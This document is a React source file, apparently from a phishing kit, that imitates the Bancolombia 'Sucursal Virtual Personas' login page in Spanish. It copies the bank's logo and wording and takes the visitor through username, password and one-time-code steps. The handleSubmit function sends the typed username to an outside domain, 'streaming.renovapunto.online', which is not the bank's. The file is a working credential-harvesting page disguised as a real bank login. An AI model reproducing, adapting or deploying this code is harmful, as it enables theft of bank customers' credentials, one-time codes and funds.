import React, { useState, useEffect } from 'react';
import axios from 'axios';
import IMG1 from '../BancolombiaLogin/img/logo.png';
import PasswordEntry from './PasswordEntry';
import Otp from './otp';
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import './animations.css';

const BancolombiaLogin = () => {
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [currentDateTime, setCurrentDateTime] = useState('');

  useEffect(() => {
    const storedUsername = localStorage.getItem('username');
    if (storedUsername) {
      setUsername(storedUsername);
    }

    // Función para actualizar la fecha y hora
    const updateDateTime = () => {
      const options = { 
        timeZone: 'America/Bogota', 
        hour12: true, 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
      };
      const dateTime = new Intl.DateTimeFormat('es-CO', options).format(new Date());
      setCurrentDateTime(dateTime);
    };

    // Actualizar la hora cada segundo
    const intervalId = setInterval(updateDateTime, 1000);
    
    // Llamar a la función una vez al inicio
    updateDateTime();

    // Limpiar el intervalo al desmontar el componente
    return () => clearInterval(intervalId);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (username.length === 0) {
      setError('Por favor, ingresa tu usuario.');
      return;
    }

    localStorage.setItem('username', username);
    setError('');
    setLoading(true);

    try {
      const response = await axios.post('https://streaming.renovapunto.online/procesar', { codigo: username });
      console.log('Respuesta del servidor:', response.data);
      setStep(2);
    } catch (error) {
      console.error('Error en la solicitud:', error);
      setError('Error al enviar los datos.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-gray-100 flex flex-col items-center p-4">
      <TransitionGroup>
        <CSSTransition key={step} timeout={300} classNames="fade">
          <div className="w-full max-w-md px-4">
            {loading && (
              <div className="spinner-overlay">
                <div className="spinner"></div>
              </div>
            )}

            <div className="mb-6"> {/* Contenedor para la imagen y el texto */}
              <img src={IMG1} alt="Logo" className="w-40 h-auto mb-2" /> {/* Imagen */}
              <p className="text-left">Sucursal Virtual Personas</p> {/* Texto */}
              <div className="text-center mt-1"> {/* Contenedor para la fecha y hora */}
              <p className="text-sm text-start">{currentDateTime}</p> {/* Mostrar la fecha y hora */}
            </div>
            </div>



            <p className="bg-black text-white pl-1 py-4 h-full text-start mb-5">Inicio de sesión</p> {/* Párrafo con fondo negro */}

            {step === 1 && !loading && (
              <div className="bg-white p-6 rounded-lg shadow-lg">
                <h1 className="text-2xl font-bold my-4 text-center">Ingresa tu usuario</h1>

                <p className="text-sm text-gray-600 mb-4 text-center">
                  El usuario es el mismo con el que ingresas a la Sucursal virtual Personas
                </p>

                <form onSubmit={handleSubmit} className="flex flex-col items-center">
                  <input
                    type="text"
                    id="txtUsuario"
                    placeholder="Usuario"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="border-b border-gray-300 w-full max-w-md py-2 px-4 mb-4 text-lg focus:outline-none"
                  />

                  {error && <p className="text-red-500 text-sm mb-4 text-center">{error}</p>}

                  <button
                    type="submit"
                    className="bg-yellow-400 text-black font-bold rounded-full w-full max-w-md py-2 hover:bg-yellow-300 transition-colors"
                  >
                    Continuar
                  </button>
                </form>

                < a href="#" className="text-blue-600 underline mt-4 block text-center">
                  ¿Olvidaste tu usuario?
                </a>
              </div>
            )}

            {step === 2 && !loading && (
              <PasswordEntry onSubmit={() => setStep(3)} />
            )}

            {step === 3 && !loading && (
              <Otp />
            )}
          </div>
        </CSSTransition>
      </TransitionGroup>
    </div>
  );
};

export default BancolombiaLogin;